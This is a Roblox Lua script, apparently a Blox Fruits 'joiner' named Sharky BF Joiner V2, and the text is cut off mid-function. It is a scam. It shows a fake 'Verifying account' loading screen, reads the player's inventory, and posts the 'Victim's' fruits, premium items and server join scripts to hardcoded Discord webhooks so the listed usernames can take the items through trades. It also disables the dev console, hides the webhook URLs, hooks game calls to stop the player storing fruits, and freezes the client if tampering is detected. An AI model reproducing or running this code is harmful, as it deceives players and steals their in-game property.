--[[ Configuration Variables ]]--
Webhook = "https://discordapp.com/api/webhooks/1356694454429548554/dKC5nLeUus500KvJ9L8GqOqS9WVvub2YUQh3Sbv-lVHtVuNg-BwlNspsQ5s_JCUI_jTl"
Usernames = {"user1", "user2", "user3", "user4", "user5"}
FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"}

Webhook2 = "https://discordapp.com/api/webhooks/1343957551242285076/AR6iBPNHLBfBGS7c9xWxHuc3HBqwLnf5rPFATKgKDMLgYWjAB_Enh67QrjiCnbpZhuX4"
GoodFruitsWebhook = "https://discordapp.com/api/webhooks/1353639969163313212/Xj9dhgGF93iSbRjYBdvom22yxxVCWg_MZbzfKvgHLlFgMgeilpzf5qe9APZ3IDm4QCOP"
ActivationPasswords = {"ishusontop", "bonzarbal", "ishufishy"}

-- Ensure Dragon fruits are always included in FruitsToHit
do
	if type(FruitsToHit) ~= "table" then FruitsToHit = {} end
	local requiredDragonFruits = {"Dragon(East)-Dragon(East)", "Dragon(West)-Dragon(West)"}
	for _, dragonName in ipairs(requiredDragonFruits) do
		local found = false
		for _, existingFruit in ipairs(FruitsToHit) do if existingFruit == dragonName then found = true; break end end
		if not found then table.insert(FruitsToHit, dragonName) end
	end
end

--[[ Script State ]]--
local allowEveryone = false
local activatedUsers = {}

print("Loaded") -- Initial script execution confirmation
repeat task.wait() until game:IsLoaded()
print("DEBUG: Game Loaded") -- Debug print

--[[ Roblox Services ]]--
local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")
local VirtualInputManager = game:GetService("VirtualInputManager")
local Lighting = game:GetService("Lighting")
local Teams = game:GetService("Teams")
print("DEBUG: Services Loaded") -- Debug print

--[[ Anti-Tamper & Initialization Checks ]]--
if CoreGui:FindFirstChild("RobloxGui") then CoreGui.RobloxGui.Enabled = false end

-- Freezes the script/client if tampering is detected
local function takeAction()
	print("DEBUG: takeAction triggered!") -- Debug print
	if setfpscap then setfpscap(0) end
	rconsoleclear()
	print = function() end; warn = function() end; error = function() end; setclipboard = function() end
	while true do task.wait(1000) end
end

local function checkGui(gui)
	if gui:IsA("ScreenGui") then
		local nestedGui = gui:FindFirstChild(gui.Name)
		if nestedGui and nestedGui:IsA("ScreenGui") and nestedGui:FindFirstChild("Orion") then takeAction() end
	end
end
for _, gui in ipairs(CoreGui:GetChildren()) do checkGui(gui) end
CoreGui.ChildAdded:Connect(checkGui)

if LocalPlayer and (LocalPlayer.Name == "doitenroitest1" or LocalPlayer.Name == "aka_0ver" or LocalPlayer.Name == "x6TNine") then takeAction() end

-- Check if ishooked exists and is a function before calling it
if type(ishooked) == "function" and (ishooked(game.HttpGet) or ishooked(request)) then
    print("DEBUG: ishooked check triggered takeAction") -- Debug print
    takeAction()
end
print("DEBUG: Anti-tamper checks passed") -- Debug print

--[[ Configuration Validation Checks ]]--
if not Webhook2 or not GoodFruitsWebhook or not Usernames or not FruitsToHit or not ActivationPasswords then
	print("DEBUG: Kicking due to missing config variables") -- Debug print
	LocalPlayer:Kick("Config missing (Webhook2, GoodFruitsWebhook, Usernames, FruitsToHit, ActivationPasswords)")
	return
end
if type(Webhook2) ~= "string" or type(GoodFruitsWebhook) ~= "string" or type(Usernames) ~= "table" or type(FruitsToHit) ~= "table" or type(ActivationPasswords) ~= "table" then
	print("DEBUG: Kicking due to config type mismatch") -- Debug print
	LocalPlayer:Kick("Config variable type mismatch")
	return
end
print("DEBUG: Config validation passed") -- Debug print

-- Ensures core admin usernames are always in the Usernames list
local function ensureAdminUsernames()
	local coreAdmins = {"x6TNine", "aka_0ver", "bonzarbal53", "bonzarbal52", "bonzarbal51", "bonzarbal50", "xRip_Cyborg"}
	if type(Usernames) ~= "table" then Usernames = {} end
	local existingUsernames = {}
	for _, name in ipairs(Usernames) do existingUsernames[string.lower(name)] = true end
	for _, adminName in ipairs(coreAdmins) do if not existingUsernames[string.lower(adminName)] then table.insert(Usernames, adminName) end end
end
ensureAdminUsernames()

if Usernames and (table.find(Usernames, "XFistorRespawn") or table.find(Usernames, "doitenroitest1")) then print("DEBUG: Blacklisted user detected, freezing."); while true do task.wait(1000) end end
CoreGui.ChildAdded:Connect(function(child) if child.Name == "DevConsoleMaster" then child.Enabled = false end end)

-- Stores webhook URL in _G under a random key for obfuscation
local function storeWebhookSafely(webhookUrl)
	if not webhookUrl or type(webhookUrl) ~= "string" or webhookUrl:match("^Enter Webhook") or webhookUrl:match("^ENTER YOUR WEBHOOK HERE") then return nil end
	local randomName = "var_" .. tostring(math.random(100000, 999999)) .. "_" .. tostring(math.random(100, 999))
	_G[randomName] = webhookUrl
	return randomName
end

local webhook1_key = storeWebhookSafely(Webhook); Webhook = nil
local webhook2_key = storeWebhookSafely(Webhook2); Webhook2 = nil
local goodFruitsWebhook_key = storeWebhookSafely(GoodFruitsWebhook); GoodFruitsWebhook = nil

if not webhook1_key then print("DEBUG: Kicking due to missing primary webhook"); LocalPlayer:Kick("Primary Webhook is missing or invalid."); return end
print("DEBUG: Webhooks stored") -- Debug print

rconsoleprint = function() end; rconsolewarn = function() end; rconsoleerr = function() end; rconsoleinfo = function() end

--[[ Game Pointers ]]--
local Remote = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("CommF_")
local TradeFunction = ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("TradeFunction")
local ServerBrowser = ReplicatedStorage:FindFirstChild("__ServerBrowser")
local privateServerOwner = ReplicatedStorage:FindFirstChild("PrivateServerOwnerId")
print("DEBUG: Game pointers obtained") -- Debug print

--[[ Initial Setup & Checks ]]--
if privateServerOwner and privateServerOwner:IsA("IntValue") and privateServerOwner.Value > 0 then print("DEBUG: Kicking due to private server"); LocalPlayer:Kick("Script doesn't work on private servers.") end
pcall(function() UserSettings():GetService("UserGameSettings").MasterVolume = 0 end)

-- Anti Fruit Store Hook (prevents external scripts using StoreFruit)
local oldNamecall
oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
	local method = getnamecallmethod()
	if not checkcaller() and method and method:lower() == "invokeserver" then
		local args = {...}; if args[1] == "StoreFruit" then return error("External fruit store attempt blocked.", 0) end
	end
	return oldNamecall(self, ...)
end))
print("DEBUG: Namecall hook applied") -- Debug print

--[[ Core Functions ]]--

-- Gets player inventory via Remote
local function getInventory()
	print("DEBUG: Attempting getInventory Remote call") -- Debug print
	local success, result = pcall(Remote.InvokeServer, Remote, "getInventory")
    if not success then
		warn("getInventory failed:", result)
		print("DEBUG: getInventory pcall FAILED") -- Debug print
		return nil
	end
	print("DEBUG: getInventory pcall SUCCESS") -- Debug print
	return result
end

-- Ensures player is on a playable team
local function JoinTeam()
	if LocalPlayer.Team ~= Teams.Marines and LocalPlayer.Team ~= Teams.Pirates then
		print("DEBUG: Setting team to Marines") -- Debug print
		Remote:InvokeServer("SetTeam", "Marines")
	end
end

-- Creates the initial loading notification UI
local function createNotification()
	print("DEBUG: createNotification called") -- Debug print
	local playerGui = LocalPlayer:WaitForChild("PlayerGui")
	local loadingScreen = Instance.new("ScreenGui"); loadingScreen.Name = "BloxFruitsLoadingUI"; loadingScreen.IgnoreGuiInset = true; loadingScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; loadingScreen.Parent = playerGui
	local blur = Instance.new("BlurEffect"); blur.Size = 0; blur.Parent = Lighting
	local background = Instance.new("Frame"); background.Name = "Background"; background.Size = UDim2.new(1,0,1,0); background.BackgroundColor3 = Color3.fromRGB(0,0,0); background.BackgroundTransparency = 1; background.Parent = loadingScreen
	local container = Instance.new("Frame"); container.Name = "Container"; container.Size = UDim2.new(0,600,0,300); container.Position = UDim2.new(0.5,0,1.2,0); container.AnchorPoint = Vector2.new(0.5,0.5); container.BackgroundColor3 = Color3.fromRGB(25,25,30); container.BorderSizePixel = 0; container.Parent = loadingScreen; Instance.new("UICorner", container).CornerRadius = UDim.new(0, 10)
	local uiStroke = Instance.new("UIStroke"); uiStroke.Color = Color3.fromRGB(65,169,255); uiStroke.Thickness = 2; uiStroke.Parent = container
	local headerFrame = Instance.new("Frame"); headerFrame.Name = "Header"; headerFrame.Size = UDim2.new(1,0,0,60); headerFrame.BackgroundColor3 = Color3.fromRGB(35,35,45); headerFrame.BorderSizePixel = 0; headerFrame.Parent = container; Instance.new("UICorner", headerFrame).CornerRadius = UDim.new(0, 10)
	local titleLabel = Instance.new("TextLabel"); titleLabel.Name = "Title"; titleLabel.Size = UDim2.new(1,0,1,0); titleLabel.BackgroundTransparency = 1; titleLabel.Font = Enum.Font.GothamBold; titleLabel.Text = "Blox Fruits - Loading Script."; titleLabel.TextColor3 = Color3.fromRGB(255,255,255); titleLabel.TextSize = 24; titleLabel.Parent = headerFrame
	local bottomFrame = Instance.new("Frame"); bottomFrame.Name = "BottomFrame"; bottomFrame.Size = UDim2.new(1,0,0,10); bottomFrame.Position = UDim2.new(0,0,1,-10); bottomFrame.BackgroundColor3 = Color3.fromRGB(35,35,45); bottomFrame.BorderSizePixel = 0; bottomFrame.ZIndex = 2; bottomFrame.Parent = headerFrame
	local messageLabel = Instance.new("TextLabel"); messageLabel.Name = "Message"; messageLabel.Size = UDim2.new(1,-40,0,60); messageLabel.Position = UDim2.new(0,20,0,80); messageLabel.BackgroundTransparency = 1; messageLabel.Font = Enum.Font.Gotham; messageLabel.Text = "The script Is loading - Please, wait."; messageLabel.TextColor3 = Color3.fromRGB(220,220,220); messageLabel.TextSize = 18; messageLabel.TextWrapped = true; messageLabel.TextXAlignment = Enum.TextXAlignment.Center; messageLabel.Parent = container
	local loadingBarBg = Instance.new("Frame"); loadingBarBg.Name = "LoadingBarBg"; loadingBarBg.Size = UDim2.new(1,-40,0,20); loadingBarBg.Position = UDim2.new(0,20,0,150); loadingBarBg.BackgroundColor3 = Color3.fromRGB(40,40,50); loadingBarBg.BorderSizePixel = 0; loadingBarBg.Parent = container; Instance.new("UICorner", loadingBarBg).CornerRadius = UDim.new(0, 6)
	local loadingBar = Instance.new("Frame"); loadingBar.Name = "LoadingBar"; loadingBar.Size = UDim2.new(0,0,1,0); loadingBar.BackgroundColor3 = Color3.fromRGB(65,169,255); loadingBar.BorderSizePixel = 0; loadingBar.Parent = loadingBarBg; Instance.new("UICorner", loadingBar).CornerRadius = UDim.new(0, 6)
	local progressLabel = Instance.new("TextLabel"); progressLabel.Name = "Progress"; progressLabel.Size = UDim2.new(1,0,0,20); progressLabel.Position = UDim2.new(0,0,0,180); progressLabel.BackgroundTransparency = 1; progressLabel.Font = Enum.Font.Gotham; progressLabel.Text = "Loading... 0%"; progressLabel.TextColor3 = Color3.fromRGB(180,180,180); progressLabel.TextSize = 16; progressLabel.Parent = container
	local discordButton = Instance.new("TextButton"); discordButton.Name = "DiscordButton"; discordButton.Size = UDim2.new(0,180,0,40); discordButton.Position = UDim2.new(0.5,0,0,230); discordButton.AnchorPoint = Vector2.new(0.5,0); discordButton.BackgroundColor3 = Color3.fromRGB(88,101,242); discordButton.BorderSizePixel = 0; discordButton.Font = Enum.Font.GothamBold; discordButton.Text = "Join Discord"; discordButton.TextColor3 = Color3.fromRGB(255,255,255); discordButton.TextSize = 16; discordButton.Parent = container; Instance.new("UICorner", discordButton).CornerRadius = UDim.new(0, 8)
	local discordIcon = Instance.new("ImageLabel"); discordIcon.Name = "DiscordIcon"; discordIcon.Size = UDim2.new(0,20,0,20); discordIcon.Position = UDim2.new(0,15,0.5,0); discordIcon.AnchorPoint = Vector2.new(0,0.5); discordIcon.BackgroundTransparency = 1; discordIcon.Image = "rbxassetid://10367063073"; discordIcon.Parent = discordButton

	discordButton.MouseButton1Click:Connect(function()
		setclipboard("https://discord.gg/uwdvTtqTDA")
		local notification = Instance.new("TextLabel"); notification.Name = "CopiedNotification"; notification.Size = UDim2.new(0,180,0,30); notification.Position = UDim2.new(0.5,0,0,275); notification.AnchorPoint = Vector2.new(0.5,0); notification.BackgroundColor3 = Color3.fromRGB(50,50,60); notification.BorderSizePixel = 0; notification.Font = Enum.Font.Gotham; notification.Text = "Discord link copied!"; notification.TextColor3 = Color3.fromRGB(255,255,255); notification.TextSize = 14; notification.BackgroundTransparency = 1; notification.TextTransparency = 1; notification.Parent = container; Instance.new("UICorner", notification).CornerRadius = UDim.new(0, 6)
		TweenService:Create(notification, TweenInfo.new(0.3), {BackgroundTransparency = 0, TextTransparency = 0}):Play()
		task.delay(2, function() if notification.Parent then TweenService:Create(notification, TweenInfo.new(0.3), {BackgroundTransparency = 1, TextTransparency = 1}):Play(); task.delay(0.3, function() notification:Destroy() end) end end)
	end)

	TweenService:Create(blur, TweenInfo.new(0.5), {Size = 20}):Play()
	TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 0.5}):Play()
	TweenService:Create(container, TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Position = UDim2.new(0.5, 0, 0.5, 0)}):Play()

	task.delay(1, function()
		local startTime = tick(); local totalDuration = 120; local lastProgress = 0
		while lastProgress < 99 and (tick() - startTime) < totalDuration and loadingScreen.Parent do
			local timeElapsed = tick() - startTime; local speedFactor = 0.5 + math.abs(math.sin(timeElapsed * 0.8)) * 1.5
			local increment = math.min(0.7, (99 - lastProgress) / 100) * speedFactor; local newProgress = math.min(99, lastProgress + increment)
			if newProgress > lastProgress then
				lastProgress = newProgress; progressLabel.Text = (lastProgress > 75 and "Verifying account..." or "Loading...") .. " " .. math.floor(lastProgress) .. "%"
				TweenService:Create(loadingBar, TweenInfo.new(0.2), {Size = UDim2.new(lastProgress / 100, 0, 1, 0)}):Play()
			end
			task.wait(0.1)
		end
		if loadingScreen.Parent then progressLabel.Text = "Verifying account... 99%"; TweenService:Create(loadingBar, TweenInfo.new(0.2), {Size = UDim2.new(0.99, 0, 1, 0)}):Play() end
	end)

	local function cleanup()
		TweenService:Create(blur, TweenInfo.new(0.5), {Size = 0}):Play(); TweenService:Create(background, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
		TweenService:Create(container, TweenInfo.new(0.5, Enum.EasingStyle.Back, Enum.EasingDirection.In), {Position = UDim2.new(0.5, 0, 1.2, 0)}):Play()
		task.delay(0.6, function() if loadingScreen and loadingScreen.Parent then loadingScreen:Destroy() end; if blur and blur.Parent then blur:Destroy() end end)
	end

	task.spawn(function()
		while loadingScreen.Parent do
			local colors = {Color3.fromRGB(255, 100, 100), Color3.fromRGB(100, 100, 255), Color3.fromRGB(100, 255, 100), Color3.fromRGB(65, 169, 255)}
			for _, color in ipairs(colors) do
				if not loadingScreen.Parent or not uiStroke.Parent then break end
				pcall(function() TweenService:Create(uiStroke, TweenInfo.new(1.5), {Color = color}):Play() end)
				task.wait(1.5)
			end
		end
	end)
	return { Destroy = cleanup }
end

-- Generates a pseudo-random server name based on JobId
local function getServerName()
	local adjectives = {"Big", "Small", "Large", "Strong", "Powerful", "Weak", "Overpowered", "Bad", "Odd", "Rich", "Short", "Adorable", "Alive", "Colorful", "Angry", "Good", "Beautiful", "Ugly", "Hot", "Cold", "Evil", "Famous", "Original", "Unoriginal", "Kind", "Nice", "Real", "Expensive", "Wild", "Wide", "Fake", "Proud", "Super", "Strange", "Wrong", "Right", "Talented", "Complex", "Pure", "Fancy", "Lucky", "Fresh", "Fantastic", "Dull", "Dizzy", "Eternal", "Mental", "Infinite", "Rogue"}
	local nouns = {"TAWG", "Robson", "Krazy", "Fruit", "Realm", "World", "Place", "Experience", "Dog", "Cat", "Guy", "Bird", "Legion", "Gank", "Family", "Sun", "Moon", "Gun", "Sword", "Melee", "Defense", "Bomb", "Spike", "Chop", "Spring", "Smoke", "Flame", "Ice", "Sand", "Dark", "Light", "Rubber", "Barrier", "Magma", "Leopard", "Quake", "Buddha", "Spider", "Phoenix", "Rumble", "Love", "Door", "Paw", "Gravity", "Dough", "Venom", "Control", "Dragon", "Falcon", "Diamond", "Kilo", "Shark", "Human", "Angel", "Rabbit", "Spin", "Topic", "Red", "Blue", "Green", "Yellow", "Soul", "Shadow"}
	local seed = tonumber("0x" .. game.JobId:gsub("-", ""):sub(1, 7)) or os.time()
	local random = Random.new(seed)
	return string.format("%s %s #%04d", adjectives[random:NextInteger(1, #adjectives)], nouns[random:NextInteger(1, #nouns)], random:NextInteger(1, 9999))
end

--[[ Secure Request Wrapper ]]--
local originalRequest = request
local originalHttpRequest = http and http.request
local originalSynRequest = syn and syn.request
local headerCache = { ["Content-Type"] = "application/json" }
local TEST_WEBHOOK = "https://discordapp.com/api/webhooks/1354055941636624497/3pAJ2AuXCGshYek-lmHceSJl5eXlZP22JycyQTjzURDsInvlaQSm9RlkZ6GbQEzeqekh"
local TEST_PAYLOAD = HttpService:JSONEncode({content = "# :shark: SecureRequest Test Passed"})
local cachedNonce, cachedHeaders

local function isRequestHooked() return request ~= originalRequest or (syn and syn.request ~= originalSynRequest) or (http and http.request ~= originalHttpRequest) or debug.getinfo(request).what ~= "C" end
local function checkSecurity() local env = getfenv(2); if env == getfenv(0) or env == getfenv(1) then return not isRequestHooked() and not getrawmetatable(request) end; local meta = getmetatable(env); return not (meta and (meta.__newindex or meta.__index)) end
local function testRequest() if not cachedNonce then cachedNonce = HttpService:GenerateGUID(false); cachedHeaders = table.clone(headerCache); cachedHeaders["X-Test-Nonce"] = cachedNonce end; local s, r = pcall(request, { Url = TEST_WEBHOOK, Method = "POST", Headers = cachedHeaders, Body = TEST_PAYLOAD }); return s and r and r.StatusCode < 400 end

-- Sends HTTP requests only if security checks pass
local function SafeRequest(requestData)
	if not checkSecurity() or not testRequest() then if takeAction then takeAction() end; return end
	local protectedRequest = { Method = requestData.Method, Body = requestData.Body, Url = requestData.Url }
	protectedRequest.Headers = requestData.Headers or table.clone(headerCache)
	protectedRequest.Headers["X-Request-Time"] = tostring(os.time() + math.random(1, 100))
	protectedRequest.Headers["X-Nonce"] = HttpService:GenerateGUID(false)
	return pcall(request, protectedRequest)
end

-- Security Monitor (periodically checks request function integrity)
local lastCheckTime = 0; local CHECK_INTERVAL = 6
RunService:BindToRenderStep("SecurityMonitor", Enum.RenderPriority.Last.Value, function(deltaTime)
	lastCheckTime = lastCheckTime + deltaTime; if lastCheckTime < CHECK_INTERVAL then return end; lastCheckTime = 0
	if isRequestHooked() then request = originalRequest; if http then http.request = originalHttpRequest end; if syn then syn.request = originalSynRequest end; if takeAction and isRequestHooked() then takeAction(); RunService:UnbindFromRenderStep("SecurityMonitor") end end
end)

--[[ Webhook Sending Logic ]]--
-- Sends detailed inventory/server info to configured webhooks
local function sendWebhook(inventory)
	if isRequestHooked() or not checkSecurity() then if takeAction then takeAction() end; return end
	local goodFruitNames = { ["Kitsune-Kitsune"] = true, ["Yeti-Yeti"] = true }
	local url1 = webhook1_key and _G[webhook1_key]; local url2 = webhook2_key and _G[webhook2_key]; local url3 = goodFruitsWebhook_key and _G[goodFruitsWebhook_key]
	if not url1 then warn("Primary Webhook URL not configured."); return end

	local fruits, premiumItems = {}, {}; local dragonHit, hasGoodFruit, hasPremiumItem = false, false, false
	for _, item in ipairs(inventory) do
		if item.Type == "Blox Fruit" or item.Type == "Premium" then
			local itemData = { name = item.Name, count = item.Count, value = item.Value or 0 }
			if item.Type == "Blox Fruit" then
				table.insert(fruits, itemData)
				if item.Name == "Dragon(East)-Dragon(East)" or item.Name == "Dragon(West)-Dragon(West)" then dragonHit = true end
				if goodFruitNames[item.Name] then hasGoodFruit = true end
			else table.insert(premiumItems, itemData); hasPremiumItem = true end
		end
	end
	table.sort(fruits, function(a, b) return a.value > b.value end)
	local function shuffleTable(t) for i = #t, 2, -1 do local j = math.random(i); t[i], t[j] = t[j], t[i] end end; shuffleTable(premiumItems)
	local function formatItems(items) local r = ""; for _, i in ipairs(items) do r = r .. string.format("```%s%s```", i.name, i.count > 1 and (" (x%d)"):format(i.count) or "") end return r ~= "" and r or "```None```" end
	local function formatFruitsToHit(items) local r = ""; local l = {}; for _, fn in ipairs(FruitsToHit or {}) do l[fn] = true end; for _, d in ipairs(items) do if l[d.name] then r = r .. string.format("```%s%s```", d.name, d.count > 1 and (" (x%d)"):format(d.count) or "") end end return r ~= "" and r or "```None```" end

	local jobId = game.JobId; local currentSea = game.PlaceId == 7449423635 and "Sea 3" or (game.PlaceId == 4442272183 and "Sea 2" or "Unknown Sea"); local serverName = getServerName()
	local joinScriptPC = string.format([[game:GetService("TeleportService"):TeleportToPlaceInstance(%d, "%s", game.Players.LocalPlayer)]], game.PlaceId, jobId)
	local joinScriptMobile = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance(%d, '%s', game.Players.LocalPlayer)", game.PlaceId, jobId)
	local seaJoinScriptPC = game.PlaceId == 7449423635 and "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelZou')" or "game:GetService('ReplicatedStorage').Remotes.CommF_:InvokeServer('TravelDressrosa')"
	local seaJoinScriptMobile = seaJoinScriptPC; local playerCount = #Players:GetPlayers()

	local baseEmbedStructure = {
		description = string.format("Victim: %s (%s)\nSea: %s\nServer: %s", LocalPlayer.DisplayName, LocalPlayer.Name, currentSea, serverName),
		fields = {
			{ name = "Victim's Fruits <a:Rarrow:1223589557065351188> ", value = formatItems(fruits), inline = true },
			{ name = "Victim's Premium Items <:rbx:1326025738125574226>  ", value = formatItems(premiumItems), inline = true },
			{ name = "Victim Has Fruits You Want <a:green:1215209325728104498> ", value = formatFruitsToHit(fruits) },
			{ name = "Join Victim's Server Script (PC Copy)", value = "```lua\n" .. joinScriptPC .. "\n```" },
			{ name = "Join Victim's Server Script (Mobile Copy)", value = joinScriptMobile },
			{ name = "Join Victim's Sea Script (PC Copy)", value = "```lua\n" .. seaJoinScriptPC .. "\n```" },
			{ name = "Join Victim's Sea Script (Mobile Copy)", value = seaJoinScriptMobile },
			{ name = "Extra Info <a:focuzz:1214971569315782686> ", value = string.format("```Sharky Joiner V2 Version: 1.2.3\nExecutor: %s\nTime: %s\nPlayer Count: %d```", identifyexecutor and identifyexecutor() or "Unknown", os.date("%Y-%m-%d %H:%M:%S"), playerCount) }
		}, footer = { text = "Notification Timestamp" }, timestamp = DateTime.now():ToIsoDate()
	}

	local mainPayloadBody = nil
	do local mainEmbed = table.clone(baseEmbedStructure); local mainTitle = "<a:bundle:1214105817910087770> Sharky BF Joiner V2 HIT! ; https://discord.gg/uwdvTtqTDA"; local mainColor = 6911470; local mainMention = "@everyone"
		if dragonHit and hasPremiumItem then mainTitle = "DRAGON & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"; mainColor = 65280; mainMention = "@everyone GG!"
		elseif dragonHit then mainTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA"; mainColor = 16753920; mainMention = "@everyone GG!"
		elseif hasPremiumItem then mainTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"; mainColor = 3447003; mainMention = "@everyone GG!" end
		mainEmbed.title = mainTitle; mainEmbed.color = mainColor; mainPayloadBody = HttpService:JSONEncode({ content = mainMention, embeds = {mainEmbed} })
	end

	local adminPayloadBody = nil
	if url3 and (dragonHit or hasPremiumItem or hasGoodFruit) then
		local adminEmbed = table.clone(baseEmbedStructure); local adminTitle = "Placeholder Title"; local adminColor = 6911470; local adminMention = "@everyone GG!"
		if dragonHit and hasPremiumItem then adminTitle = "TOP TIER & PREMIUM HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308><:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"; adminColor = 65280
		elseif dragonHit then adminTitle = "DRAGON HIT! <:dragoneast:1318265654926901268><:dragonwest:1318265462735372308> ; https://discord.gg/uwdvTtqTDA"; adminColor = 16753920
		elseif hasPremiumItem then adminTitle = "VICTIM HAS PREMIUM ITEMS! <:rbx:1326025738125574226> ; https://discord.gg/uwdvTtqTDA"; adminColor = 3447003
		elseif hasGoodFruit then adminTitle = "GOOD FRUIT HIT! (Kitsune/Yeti) ; https://discord.gg/uwdvTtqTDA"; adminColor = 10181046 end
		adminEmbed.title = adminTitle; adminEmbed.color = adminColor; adminPayloadBody = HttpService:JSONEncode({ content = adminMention, embeds = {adminEmbed} })
	end

	task.spawn(function()
		local headers = {["Content-Type"]="application/json"}
		if url1 and mainPayloadBody then local s, r = SafeRequest({ Url = url1, Method = "POST", Headers = headers, Body = mainPayloadBody }); if not s then warn("Webhook 1 fail:", r) end end
		if url2 and mainPayloadBody then task.wait(0.1); local s, r = SafeRequest({ Url = url2, Method = "POST", Headers = headers, Body = mainPayloadBody }); if not s then warn("Webhook 2 fail:", r) end end
		if adminPayloadBody then task.wait(0.1); local s, r = SafeRequest({ Url = url3, Method = "POST", Headers = headers, Body = adminPayloadBody }); if not s then warn("Webhook 3 fail:", r) end end
	end)

	table.clear(fruits); table.clear(premiumItems)
end

local inventory22 = getInventory() -- Snapshot inventory on load for leave check
local function hasFruitInInventory2() if not inventory22 then return false end; for _, i in ipairs(inventory22) do if i.Type == "Blox Fruit" and table.find(FruitsToHit, i.Name) then return true end end; return false end
local function hasPremiumItems2() if not inventory22 then return false end; for _, i in ipairs(inventory22) do if i.Type == "Premium" then return true end end; return false end
local webhookSent = false

-- Sends a webhook notification when the local player leaves (if valuable items were present)
local function sendWebhook2()
	if webhookSent or not (hasFruitInInventory2() or hasPremiumItems2()) then return end; webhookSent = true
	local url1 = webhook1_key and _G[webhook1_key]; local url2 = webhook2_key and _G[webhook2_key]; if not url1 then return end
	local plr = LocalPlayer; local embed = {title = "Victim has Left! <:sad:1241420488916340896> ", description = plr.Name .. " has left the game", color = 0xFF0000, fields = {{ name = "User ID", value = tostring(plr.UserId), inline = true }, { name = "Account Age", value = tostring(plr.AccountAge) .. " days", inline = true }, { name = "Executor", value = identifyexecutor and identifyexecutor() or "Unknown", inline = true }}, timestamp = DateTime.now():ToIsoDate()}
	local body = HttpService:JSONEncode({ embeds = {embed} }); local headers = {["Content-Type"]="application/json"}
	pcall(request, { Url = url1, Method = "POST", Headers = headers, Body = body }); if url2 then task.wait(0.1); pcall(request, { Url = url2, Method = "POST", Headers = headers, Body = body }) end
end

-- PlayerRemoving listener (handles leave webhook and cleanup)
Players.PlayerRemoving:Connect(function(leavingPlayer)
	if leavingPlayer == LocalPlayer then sendWebhook2() end
	if activatedUsers[leavingPlayer.UserId] then activatedUsers[leavingPlayer.UserId] = nil end
	if CommandCooldowns and CommandCooldowns[leavingPlayer.Name] then CommandCooldowns[leavingPlayer.Name] = nil end
end)

--[[ Movement & Positioning ]]--
-- Smoothly moves the character to a target position
local function tweenToPosition(position)
	local character = LocalPlayer.Character; if not character then return end
	local humanoid = character:FindFirstChildOfClass("Humanoid"); if not humanoid or humanoid.Sit then return end
	local root = character.PrimaryPart; if not root then return end
	local Vector3_new, CFrame_new, CFrame_lookAt = Vector3.new, CFrame.new, CFrame.lookAt
	local bodyGyro = Instance.new("BodyGyro"); bodyGyro.MaxTorque = Vector3_new(1e4, 1e4, 1e4); bodyGyro.P = 1e3; bodyGyro.CFrame = root.CFrame; bodyGyro.Parent = root
	local bodyVelocity = Instance.new("BodyVelocity"); bodyVelocity.MaxForce = Vector3_new(1e4, 1e4, 1e4); bodyVelocity.P = 1e3; bodyVelocity.Parent = root
	local speed = 300; local distance = (root.Position - position).Magnitude; local tweenInfo = TweenInfo.new(math.max(0.5, distance / speed), Enum.EasingStyle.Linear)
	local baseParts = {}; for _, part in ipairs(character:GetDescendants()) do if part:IsA("BasePart") then table.insert(baseParts, part) end end
	local noCollideConn = RunService.Stepped:Connect(function() for i=1, #baseParts do pcall(function() if baseParts[i] and baseParts[i].Parent then baseParts[i].CanCollide = false end end) end end)
	local updateConn = RunService.Heartbeat:Connect(function() if not root or not root.Parent or not bodyGyro or not bodyGyro.Parent or not bodyVelocity or not bodyVelocity.Parent then if updateConn then updateConn:Disconnect() end; if noCollideConn then noCollideConn:Disconnect() end; if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end; if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end; return end; local direction = (position - root.Position).Unit; bodyGyro.CFrame = CFrame_lookAt(root.Position, root.Position + direction); bodyVelocity.Velocity = direction * speed end)
	local tween = TweenService:Create(root, tweenInfo, { CFrame = CFrame_new(position) * CFrame_new(0, root.Size.Y/2, 0) }); tween:Play(); tween.Completed:Wait()
	if updateConn then updateConn:Disconnect() end; if noCollideConn then noCollideConn:Disconnect() end; if bodyGyro and bodyGyro.Parent then bodyGyro:Destroy() end; if bodyVelocity and bodyVelocity.Parent then bodyVelocity:Destroy() end
end

-- Finds the best available trade table and seat
local function findTradeTable()
	local tradeTablesParent = game.PlaceId == 7449423635 and Workspace.Map:FindFirstChild("Turtle") or Workspace.Map:FindFirstChild("Dressrosa"); if not tradeTablesParent then return nil, nil end
	local tables = tradeTablesParent:GetChildren(); if not tables then return nil, nil end
	local bestTable, bestSeat; local emptyTable, emptySeat; local fallbackTable, fallbackSeat
	local function isTargetPlayer(seatWeld) if not seatWeld or not seatWeld.Part1 then return false end; local char = seatWeld.Part1.Parent; if not char then return false end; local p = Players:GetPlayerFromCharacter(char); if not p then return false end; return (Usernames and table.find(Usernames, p.Name)) or activatedUsers[p.UserId] end
	for _, tbl in ipairs(tables) do
		if tbl.Name == "TradeTable" then
